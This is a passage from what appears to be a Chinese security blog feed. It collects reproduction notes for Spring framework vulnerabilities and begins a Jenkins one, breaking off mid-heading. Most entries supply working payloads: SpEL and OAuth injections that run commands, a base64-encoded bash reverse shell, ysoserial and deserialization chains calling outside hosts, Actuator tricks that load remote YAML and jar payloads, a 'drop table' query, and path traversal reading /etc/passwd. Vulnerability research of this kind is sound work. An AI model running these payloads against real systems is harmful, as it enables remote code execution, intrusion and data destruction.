id="CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞"><a href="#CNVD-2016-04742-Spring-Boot框架SPEL表达式注入漏洞" class="headerlink" title="CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞"></a>CNVD-2016-04742 Spring Boot框架SPEL表达式注入漏洞</h3><p>影响版本：1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</p><p><a href="https://www.cnblogs.com/litlife/p/10183137.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/10183137.html</a></p><p>下载存在漏洞的版本1.3.0：<a href="https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/archive/v1.3.0.RELEASE.zip</a></p><p>POC：</p><pre><code>/?payload=${new%20java.lang.String(new%20byte[]{70, 66, 66, 50, 48, 52, 65, 52, 48, 54, 49, 70, 70, 66, 68, 52, 49, 50, 56, 52, 65, 56, 52, 67, 50, 53, 56, 67, 49, 66, 70, 66})}结果：FBB204A4061FFBD41284A84C258C1BFB返回结果是md5(wooyun)</code></pre><h3 id="CVE-2016-6652-Spring-Data-JPA-SQL盲注"><a href="#CVE-2016-6652-Spring-Data-JPA-SQL盲注" class="headerlink" title="CVE-2016-6652 Spring Data JPA SQL盲注"></a>CVE-2016-6652 Spring Data JPA SQL盲注</h3><p>影响版本：Spring Data JPA 1.10.2、1.9.4</p><p><a href="https://www.seebug.org/vuldb/ssvid-92534" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92534</a></p><h3 id="CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞"><a href="#CVE-2017-4971-Spring-WebFlow-远程代码执行漏洞" class="headerlink" title="CVE-2017-4971 Spring WebFlow 远程代码执行漏洞"></a>CVE-2017-4971 Spring WebFlow 远程代码执行漏洞</h3><p>影响版本：Spring Web Flow 2.4.0 to 2.4.4</p><p>使用vulhub搭建环境后，在添加poc执行</p><pre><code>&amp;_(new+java.lang.ProcessBuilder(&quot;ping&quot;,&quot;xxx.ceye.io&quot;)).start()=vulhub</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131651.png" alt="image-20200331111056698"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131653.png" alt="image-20200331111146008"></p><p>无害化payload检测，如果 response header 中出现 vulnerable 头，则有漏洞：</p><pre><code>&amp;_T(org.springframework.web.context.request.RequestContextHolder).getRequestAttributes().getResponse().addHeader(&quot;vulnerable&quot;,&quot;True&quot;).aaa=n1nty</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131655.png" alt="image-20200331111225481"></p><h3 id="CVE-2017-8045-Spring-Amqp中的远程代码执行"><a href="#CVE-2017-8045-Spring-Amqp中的远程代码执行" class="headerlink" title="CVE-2017-8045 Spring Amqp中的远程代码执行"></a>CVE-2017-8045 Spring Amqp中的远程代码执行</h3><p>影响版本：1.7.4、1.6.11和1.5.7之前的Spring AMQP版本</p><p><a href="https://xz.aliyun.com/t/36" target="_blank" rel="noopener">https://xz.aliyun.com/t/36</a></p><h3 id="CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码"><a href="#CVE-2017-8046-Spring-Data-REST-PATCH请求远程执行代码" class="headerlink" title="CVE-2017-8046 Spring Data REST PATCH请求远程执行代码"></a>CVE-2017-8046 Spring Data REST PATCH请求远程执行代码</h3><p>影响版本：Spring Data REST 2.5.12, 2.6.7, 3.0 RC3之前的版本、Spring Data release trains Kay-RC3之前的版本、Spring Boot 2.0.0M4之前的版本</p><p><a href="https://www.cnblogs.com/co10rway/p/9380441.html" target="_blank" rel="noopener">https://www.cnblogs.com/co10rway/p/9380441.html</a></p><p>利用POC执行：</p><pre><code>[{ &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&#39;ping xxx.ceye.io&#39;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; }]</code></pre><p>反弹shell，其中反弹shell命令需要借助编码来减少重定向出错的问题<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">java.lang.Runtime.exec() Payload Workarounds</a>：</p><pre><code>[{ &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(&#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94LngueC54Lzg4OTkgMD4mMQ==}|{base64,-d}|{bash,-i}&#39;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; }]</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131657.png" alt="image-20200331114458798"></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131700.png" alt="image-20200331115328723"></p><h3 id="CVE-2018-1258-Spring-Security未经授权的访问"><a href="#CVE-2018-1258-Spring-Security未经授权的访问" class="headerlink" title="CVE-2018-1258 Spring Security未经授权的访问"></a>CVE-2018-1258 Spring Security未经授权的访问</h3><p>影响版本：Spring Framework 5.0.5.RELEASE和Spring Security（任何版本）</p><p>暂无详细信息</p><h3 id="CVE-2018-1259-具有XMLBeam的Spring-DataXXE"><a href="#CVE-2018-1259-具有XMLBeam的Spring-DataXXE" class="headerlink" title="CVE-2018-1259 具有XMLBeam的Spring DataXXE"></a>CVE-2018-1259 具有XMLBeam的Spring DataXXE</h3><p>影响版本：</p><pre><code>XMLBeam 1.4.14或更早版本结合使用的Spring Data CommonsSpring Data Commons 1.13至1.13.11（Ingalls SR11）Spring Data REST 2.6至2.6.11（Ingalls SR11）Spring Data Commons 2.0至2.0.6（Kay SR6）Spring Data REST 3.0至3.0.6（Kay SR6）</code></pre><p><a href="http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/tag/CVE-2018-1259/</a></p><p><a href="https://xz.aliyun.com/t/2341" target="_blank" rel="noopener">https://xz.aliyun.com/t/2341</a></p><h3 id="CVE-2018-1270-Spring-Messaging远程代码执行漏洞"><a href="#CVE-2018-1270-Spring-Messaging远程代码执行漏洞" class="headerlink" title="CVE-2018-1270 Spring Messaging远程代码执行漏洞"></a>CVE-2018-1270 Spring Messaging远程代码执行漏洞</h3><p>影响版本：Spring Framework 5.0 to 5.0.4。Spring Framework 4.3 to 4.3.14</p><p>同样利用vulhub搭建环境，首先我们先拦截connect，查看通过的ws包，点击后会有这么一个请求</p><pre><code>ws://x.x.x.x:8080/gs-guide-websocket/845/beqcexeb/websocket</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131702.png" alt="image-20200331163229079"></p><p>从bp中看到来回四个包，其中的内容为如上所示，修改如下请求包</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131704.png" alt="image-20200331170304494"></p><p>在发送任意消息，即可触发</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131707.png" alt="image-20200331170357879"></p><p>或者尝试使用vulhub提供的脚本，但是此脚本并不具备通用性，需要修改使用<a href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py" target="_blank" rel="noopener">poc</a></p><h3 id="CVE-2018-1271-Spring-MVC-目录穿越漏洞"><a href="#CVE-2018-1271-Spring-MVC-目录穿越漏洞" class="headerlink" title="CVE-2018-1271 Spring MVC 目录穿越漏洞"></a>CVE-2018-1271 Spring MVC 目录穿越漏洞</h3><p>当Spring MVC的静态资源存放在Windows系统上时，攻击可以通过构造特殊URL导致目录遍历漏洞。</p><p>此漏洞触发条件较高：</p><ol><li>Server运行于Windows系统上</li><li>从文件系统提供的文件服务（比如使用file协议，但不是file open）</li><li>没有使用CVE-2018-1199漏洞的补丁</li><li>不使用Tomcat或者是WildFly做Server</li></ol><p>漏洞利用和复现: </p><p><a href="https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://blog.knownsec.com/2018/08/spring-mvc-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9Ecve-2018-1271%E5%88%86%E6%9E%90/</a></p><h3 id="CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞"><a href="#CVE-2018-1273-Spring-Expression-Language-SPEL表达式注入漏洞" class="headerlink" title="CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞"></a>CVE-2018-1273 Spring Expression Language SPEL表达式注入漏洞</h3><p>影响版本：</p><pre><code>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)Spring Data Commons 2.0 to 2.0.5 (Kay SR5)Spring Data REST 3.0 - 3.0.5 (Kay SR5)</code></pre><p><a href="https://www.cnblogs.com/hac425/p/9656747.html" target="_blank" rel="noopener">https://www.cnblogs.com/hac425/p/9656747.html</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131709.png" alt="image-20200331171801189"></p><p>POC：</p><pre><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=xxxusername[T(java.lang.Runtime).getRuntime().exec(&quot;ping+xxx.ceye.io&quot;)]=test</code></pre><h3 id="CVE-2018-1260-Spring-Security-Oauth2-远程代码执行"><a href="#CVE-2018-1260-Spring-Security-Oauth2-远程代码执行" class="headerlink" title="CVE-2018-1260 Spring Security Oauth2 远程代码执行"></a>CVE-2018-1260 Spring Security Oauth2 远程代码执行</h3><p>影响版本：</p><pre><code>Spring Security OAuth 2.3 to 2.3.2Spring Security OAuth 2.2 to 2.2.1Spring Security OAuth 2.1 to 2.1.1Spring Security OAuth 2.0 to 2.0.14</code></pre><p><a href="https://www.seebug.org/vuldb/ssvid-97287" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-97287</a></p><p>此漏洞和CVE-2016-4977类似</p><p>POC：</p><pre><code>http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://www.baidu.com&amp;scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22ping%20r9rub4.ceye.io%22%29%7D</code></pre><h3 id="CVE-2018-15758-spring-security-oauth2权限提升"><a href="#CVE-2018-15758-spring-security-oauth2权限提升" class="headerlink" title="CVE-2018-15758 spring-security-oauth2权限提升"></a>CVE-2018-15758 spring-security-oauth2权限提升</h3><p>影响版本：</p><pre><code>Spring Security OAuth 2.3至2.3.3Spring Security OAuth 2.2至2.2.2Spring Security OAuth 2.1至2.1.2Spring Security OAuth 2.0到2.0.15</code></pre><p>使用了EnableResourceServer并且用了<code>AuthorizationRequest</code>的话。那么攻击者可以重新发送一次用过的验证请求，或者进行相应参数修改，从而造成权限提升。</p><p>例如劫持code，并且篡改其中的scope到all的话：</p><pre><code>http://localhost:8080/oauth/authorize?client_id=client&amp;response_type=code&amp;redirect_uri=http://127.0.0.1&amp;scope=openid</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131712.png" alt="image-20200401094048949"></p><p>即授权了读取权限的时候，修改为all就可以获得全部权限。</p><h3 id="CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历"><a href="#CVE-2019-3799-Spring-Cloud-Config-Server-目录遍历" class="headerlink" title="CVE-2019-3799 Spring Cloud Config Server: 目录遍历"></a>CVE-2019-3799 Spring Cloud Config Server: 目录遍历</h3><p>影响版本：Spring-Cloud-Config-Server  &lt; 2.1.2, 2.0.4, 1.4.6</p><p>下载受影响的版本构建：<a href="https://github.com/spring-cloud/spring-cloud-config" target="_blank" rel="noopener">https://github.com/spring-cloud/spring-cloud-config</a></p><pre><code>cd spring-cloud-config-server                                                                   ../mvnw spring-boot:run</code></pre><p>构建成功后访问：</p><pre><code>http://127.0.0.1:8888/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd    </code></pre><p><img src="Spring 漏洞.assets/image-20200401100511941.png" alt="image-20200401100511941"></p><p>其中路径代表：<code>/{name}/{profile}/{label}/</code>，如下中所显示的json。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200401131715.png" alt="image-20200401102213915"></p><h3 id="CVE-2019-3778-Spring-Security-OAuth-开放重定向"><a href="#CVE-2019-3778-Spring-Security-OAuth-开放重定向" class="headerlink" title="CVE-2019-3778 Spring Security OAuth 开放重定向"></a>CVE-2019-3778 Spring Security OAuth 开放重定向</h3><p>影响版本：</p><pre><code>Spring Security OAuth 2.3 to 2.3.4Spring Security OAuth 2.2 to 2.2.3Spring Security OAuth 2.1 to 2.1.3Spring Security OAuth 2.0 to 2.0.16</code></pre><p><a href="https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70" target="_blank" rel="noopener">https://medium.com/@riemannbernhardj/investigating-spring-security-oauth2-cve-2019-3778-and-cve-2019-11269-a-p-o-c-attack-44895f2a5e70</a></p><p>用户登录后，CLIENT APP执行的以下请求包含REDIRECT_URI参数。 只需添加一个百分号即可触发重定向，而不是通过RedirectMismatchException错误来绕过验证。</p><p>例如原始请求如下：</p><pre><code>/auth/oauth/authorize?response_type=code&amp;client_id=R2dpxQ3vPrtfgF72&amp;scope=user_info&amp;state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri=http://localhost:8086/login</code></pre><p>只需要修改为：</p><pre><code>/auth/oauth/authorize?response_type=code&amp;client_id=R2dpxQ3vPrtfgF72&amp;scope=user_info&amp;state=HPRbfRgJLWdmLMi9KXeLJDesMLfPC3vZ0viEkeIvGuQ%3D&amp;redirect_uri=http://%localhost:8086/login</code></pre><p>这样就不会产生原本的认证错误，而且直接跳转到地址</p><pre><code>Location: http://localhost:8086/login</code></pre><h3 id="CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞"><a href="#CNVD-2019-11630-Spring-Boot-Actuator命令执行漏洞" class="headerlink" title="CNVD-2019-11630 Spring Boot Actuator命令执行漏洞"></a>CNVD-2019-11630 Spring Boot Actuator命令执行漏洞</h3><p><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#" target="_blank" rel="noopener">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators#</a></p><p>这个漏洞并不像是单一的问题产生，更像是一个渗透入侵的过程。有很多值得在意的知识点</p><ol><li>Spring Boot 1-1.4，无需身份验证即可访问以下敏感路径，而在2.x中，存在于/actuator路径下。</li></ol><pre><code>/dump-显示线程转储（包括堆栈跟踪）/trace-显示最后几条HTTP消息（其中可能包含会话标识符）/logfile-输出日志文件的内容/shutdown-关闭应用程序/mappings-显示所有MVC控制器映射/env-提供对配置环境的访问/restart-重新启动应用程序</code></pre><ol start="2"><li>jolokia进行远程代码执行，Jolokia允许通过HTTP访问所有已注册的MBean，并且旨在执行与JMX相同的操作。可以使用URL列出所有可用的MBeans操作：<a href="http://127.0.0.1:8090/jolokia/list" target="_blank" rel="noopener">http://127.0.0.1:8090/jolokia/list</a></li></ol><p>Logback库提供的<strong>reloadByURL</strong>操作使我们可以从外部URL重新加载日志配置，地址如：</p><pre><code>http://localhost:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/artsploit.com!/logback.xmllogback.xml：&lt;configuration&gt;  &lt;insertFromJNDI env-entry-name=&quot;ldap://artsploit.com:1389/jndi&quot; as=&quot;appName&quot; /&gt;&lt;/configuration&gt;</code></pre><p>reloadByURL功能从<a href="http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。" target="_blank" rel="noopener">http://artsploit.com/logback.xml下载新配置，并将其解析为Logback配置。这就导致两个问题：XXE盲攻击、恶意LDAP服务器解析引用导致RCE。</a></p><ol start="3"><li>通过/env来修改配置</li></ol><p>如果Spring Cloud Libraries在类路径中，则<strong>‘/ env’</strong>端点允许您修改Spring环境属性。</p><pre><code class="html">POST /env HTTP/1.1Host: 127.0.0.1:8090Content-Type: application/x-www-form-urlencodedContent-Length: 65eureka.client.serviceUrl.defaultZone=http://artsploit.com/n/xstream</code></pre><p>此属性将Eureka serviceURL修改为任意值。Eureka Server通常用作发现服务器，目标类路径中具有Eureka-Client &lt;1.8.7，则可以利用其中的<strong>XStream反序列化漏洞</strong>。</p><p>其中xstream的内容类似如下：</p><pre><code>&lt;linked-hash-set&gt;  &lt;jdk.nashorn.internal.objects.NativeString&gt;    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;      &lt;dataHandler&gt;        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;                    &lt;command&gt;                      &lt;string&gt;/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;                    &lt;/command&gt;                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;                  &lt;/next&gt;                &lt;/iter&gt;                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;                  &lt;method&gt;                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;                    &lt;name&gt;start&lt;/name&gt;                    &lt;parameter-types/&gt;                  &lt;/method&gt;                  &lt;name&gt;foo&lt;/name&gt;                &lt;/filter&gt;                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;              &lt;/serviceIterator&gt;              &lt;lock/&gt;            &lt;/cipher&gt;            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;            &lt;ibuffer&gt;&lt;/ibuffer&gt;          &lt;/is&gt;        &lt;/dataSource&gt;      &lt;/dataHandler&gt;    &lt;/value&gt;  &lt;/jdk.nashorn.internal.objects.NativeString&gt;&lt;/linked-hash-set&gt;</code></pre><p>然后调用’/ refresh’端点。</p><ol start="4"><li>有一种通过Spring环境属性修改来实现RCE的更可靠方法：</li></ol><pre><code class="html">POST /env HTTP/1.1Host: 127.0.0.1:8090Content-Type: application/x-www-form-urlencodedContent-Length: 59spring.cloud.bootstrap.location=http://artsploit.com/yaml-payload.yml</code></pre><p>该请求修改了“ spring.cloud.bootstrap.location”属性，该属性用于加载外部配置并以YAML格式解析它。为了做到这一点，我们还需要调用“/refresh”端点。</p><pre><code class="html">POST /refresh HTTP/1.1Host: 127.0.0.1:8090Content-Type: application/x-www-form-urlencodedContent-Length: 0</code></pre><p>从远程服务器获取YAML配置时，将使用SnakeYAML库进行解析，该库也容易受到反序列化攻击。有效载荷（yaml-payload.yml）可以通过使用前述的Marshalsec研究生成：</p><pre><code class="html">!!javax.script.ScriptEngineManager [  !!java.net.URLClassLoader [[    !!java.net.URL [&quot;http://artsploit.com/yaml-payload.jar&quot;]  ]]]</code></pre><p>该jar文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager构造函数的执行。jar文件可以在如下地址找到：<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></p><ol start="5"><li>/env配置</li></ol><p>除了关于执行RCE的地方，还有一些设置也很有用。</p><p><strong>spring.datasource.tomcat.validationQuery = drop + table + users-</strong>允许您指定任何SQL查询，它将针对当前数据库自动执行。它可以是任何语句，包括插入，更新或删除。</p><p><strong>spring.datasource.tomcat.url</strong> = jdbc:hsqldb:<a href="https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。" target="_blank" rel="noopener">https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。</a></p><p>这种设置只在1.x中，在Spring Boot 2.x中，改为了json格式。</p><h3 id="CVE-2019-11269-Spring-Security-OAuth-开放重定向"><a href="#CVE-2019-11269-Spring-Security-OAuth-开放重定向" class="headerlink" title="CVE-2019-11269 Spring Security OAuth 开放重定向"></a>CVE-2019-11269 Spring Security OAuth 开放重定向</h3><p>此漏洞为CVE-2019-3778的延伸版本，效果一致</p><p>影响版本：</p><pre><code>Spring Security OAuth 2.3至2.3.5Spring Security OAuth 2.2至2.2.4Spring Security OAuth 2.1至2.1.4Spring Security OAUth 2.0至2.0.17</code></pre><h3 id="CVE-2020-5398-Spring-Framework-RFD漏洞"><a href="#CVE-2020-5398-Spring-Framework-RFD漏洞" class="headerlink" title="CVE-2020-5398 Spring Framework RFD漏洞"></a>CVE-2020-5398 Spring Framework RFD漏洞</h3><p>影响版本： Spring Framework, versions 5.2.0 to 5.2.3, 5.1.0 to 5.1.13, 5.0.0 to 5.0.16</p><p>触发此漏洞的要求可以控制<code>content-disposition</code>文件名和扩展名来下载文件。触发的类型有些类似钓鱼文件。</p><pre><code>&lt;a href=”https://&lt;trusted-server&gt;.com/api/users/&lt;attacker_id&gt;.cmd&quot; download&gt;Click me, Im a dolphin&lt;/a&gt;</code></pre><p>先准备一个受控制的配置文件等，上传到受信的服务器中，虽然对服务器不造成影响。但是可以在其中注入一些payload。</p><p>由于下载的文件名是受前端控制，发送filename的时候可以自己构造文件名下载。</p><p>spring对不能识别的文件下载的时候按照json格式来处理，但是url仍然可以使用。</p><p>当受害者点击如上的地址时，会下载一个&lt;attacker_id&gt;.cmd执行文件。原来spring对这种问题的处理是添加后缀为txt来改变文件的可执行效果。</p><p>但是这个设置可以绕过，采用如下形式：</p><pre><code>filename：secure_install.cmd&quot;;</code></pre><p>会在表头中闭合造成如下效果：</p><pre><code>Content-Disposition: attachment; filename=&quot;secure_install.cmd&quot;;.txt&quot;</code></pre><p>从而达到绕过限制来下载预先设定好的可执行文件等。</p><h3 id="CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露"><a href="#CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露" class="headerlink" title="CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露"></a>CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露</h3><p>影响版本：spring-cloud-config-server &lt; 2.2.2</p><p><a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md" target="_blank" rel="noopener">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md</a></p><p>poc：</p><pre><code>利用点1：curl http://127.0.0.1:9988/foo/profiles/%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp/aaa.xxx读取/User/xuanyonghao/tmp/aaa.xxx文件foo 对应 {application}profiles 对应 {profiles}%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp 对应 {label}todo 条件限制：todo 1. 文件必须有后缀，也就是.txt等等。todo 2. cloud: config: server: native: search-locations: file:///tmp/{label}，此处的目录需要有{application}或{profiles}或{label}，因为在上述触发点会对url对应段进行替换进来location，导致目录穿越，但是会限制文件后缀利用点2：org.springframework.cloud.config.server.resource.ResourceController#resolveLabel(java.lang.String)利用此处把label处的(_)替换为/curl http://127.0.0.1:9988/foo/profiles/..%28_%29Users%28_%29xuanyonghao%28_%29tmp/aaa.xxxtodo 条件限制：todo 1. 文件必须有后缀，也就是.txt等等。todo 2. 不像利用点1处，不需要配置{application}{profiles}{label}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虽说是Spring框架漏洞，但以下包含并不仅Spring Framework，Spring Boot，还有Spring Cloud，Spring Data，Spring Security等。&lt;/p&gt;
&lt;h3 id=&quot;CVE-2010-1622-Spring-Framewor
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Jenkins漏洞集合复现</title>
    <link href="/2020/03/Jenkins%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%A4%8D%E7%8E%B0/"/>
    <id>/2020/03/Jenkins漏洞集合复现/</id>
    <published>2020-03-27T06:56:40.000Z</published>
    <updated>2020-03-27T07:07:18.135Z</updated>
    
    <content type="html"><![CDATA[<p>复现文章和脚本大都是网上收集，大部分能找到出处的，个别找不到明确的地址。</p><h3 id="CVE-2015-8103-反序列化远程代码执行"><a href="#CVE-2015-8103-反序列化远程代码执行" class="headerlink" title="CVE-2015-8103 反序列化远程代码执行"></a>CVE-2015-8103 反序列化远程代码执行</h3><p>1.638之前的Jenkins和1.625.2之前的LTS中的Jenkins CLI子系统，允许远程攻击者通过制作的序列化Java对象执行有问题的commons-collections。</p><p>利用脚本：<a href="https://github.com/LeoHuang2015/jenkins-cli-exploit" target="_blank" rel="noopener">https://github.com/LeoHuang2015/jenkins-cli-exploit</a></p><p>执行后有类似如下反应：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145130.png" alt="image-20200327115239320"></p><p>还可以使用msf中的模块<code>exploit/linux/misc/jenkins_java_deserialize</code>来执行攻击反弹shell。</p><h3 id="CVE-2016-0788-Jenkins-CI和LTS-远程代码执行漏洞"><a href="#CVE-2016-0788-Jenkins-CI和LTS-远程代码执行漏洞" class="headerlink" title="CVE-2016-0788 Jenkins CI和LTS 远程代码执行漏洞"></a>CVE-2016-0788 Jenkins CI和LTS 远程代码执行漏洞</h3><p>CloudBeesJenkinsCI1.650之前版本和LTS1.642.2之前版本的remoting模块中存在安全漏洞。远程攻击者可通过打开JRMP监听程序利用该漏洞执行任意代码。</p><p>利用需要X-Jenkins-CLI2-Port对应的端口，如果Jenkins无法获取CLI版本2的端口标头“ X-Jenkins-CLI2-Port”，它会退回到版本1。</p><p>利用ys生成二进制文件：<code>java -jar ysoserial.jar CommonsCollections3 &quot;curl http://r9rub4.ceye.io/&quot; &gt; payload.bin</code></p><p>利用脚本：<code>https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py</code></p><p>发送的二进制文件实际上是十六进制的(&lt;===[JENKINS REMOTING CAPACITY]===&gt;)与其后base64的编码构成。使用类似反应如下：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145133.png" alt="image-20200327121322560"></p><h3 id="CVE-2016-0792-低权限用户命令执行"><a href="#CVE-2016-0792-低权限用户命令执行" class="headerlink" title="CVE-2016-0792 低权限用户命令执行"></a>CVE-2016-0792 低权限用户命令执行</h3><p>影响版本：jenkins小于 1.650</p><p>利用脚本：<code>https://github.com/jpiechowka/jenkins-cve-2016-0792</code></p><p>执行后类似如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145135.png" alt="image-20200327120724417"></p><h3 id="CVE-2016-9299-代码执行"><a href="#CVE-2016-9299-代码执行" class="headerlink" title="CVE-2016-9299 代码执行"></a>CVE-2016-9299 代码执行</h3><p>2.32之前的Jenkins和2.19.3之前的LTS中的远程处理模块允许远程攻击者通过精心制作的序列化Java对象执行任意代码，从而触发对第三方服务器的LDAP查询。</p><p>关于这个漏洞的分析和代码利用，已经有详细的分析文章：<code>https://paper.seebug.org/199/</code></p><p>msf有成熟的利用模块：<code>exploit/linux/misc/jenkins_ldap_deserialize</code></p><h3 id="CVE-2017-1000353-Jenkins-CI-远程代码执行"><a href="#CVE-2017-1000353-Jenkins-CI-远程代码执行" class="headerlink" title="CVE-2017-1000353 Jenkins-CI 远程代码执行"></a>CVE-2017-1000353 Jenkins-CI 远程代码执行</h3><p>影响版本：Jenkins&lt;=2.56。Jenkins LTS &lt;= 2.46.1</p><p>下载poc<code>https://github.com/vulhub/CVE-2017-1000353</code></p><p>执行生成字节码文件。</p><pre><code>java  -jar  CVE-2017-1000353-SNAPSHOT-all.jar  jenkins_poc.ser  &quot;curl http://xxx.ceye.io&quot;</code></pre><p>利用py文件来进行发送</p><pre><code>python exploit.py http://x.x.x.x:8080 jenkins_poc.ser</code></pre><p>会有如下反应</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145340.png" alt="image-20200325165630218"></p><h3 id="CVE-2018-1000110-用户枚举"><a href="#CVE-2018-1000110-用户枚举" class="headerlink" title="CVE-2018-1000110 用户枚举"></a>CVE-2018-1000110 用户枚举</h3><pre><code>模糊搜索：http://x.x.x.x:8080/search/?q=a</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145344.png" alt="image-20200325165813965"></p><pre><code>http://x.x.x.x:8080/search/suggest?query=a</code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/20200327145347.png" alt="image-20200325165911492"></p><p>如果git插件小于3.7，也可以使用如下</p><pre><code>http://x.x.x.x:8080/git/search/?q=ahttp://x.x.x.x:8080/git/search/suggest?query=a</code></pre><h3 id="CVE-2018-1000861-远程命令执行"><a href="#CVE-2018-1000861-远程命令执行" class="headerlink" title="CVE-2018-1000861 远程命令执行"></a>CVE-2018-1000861 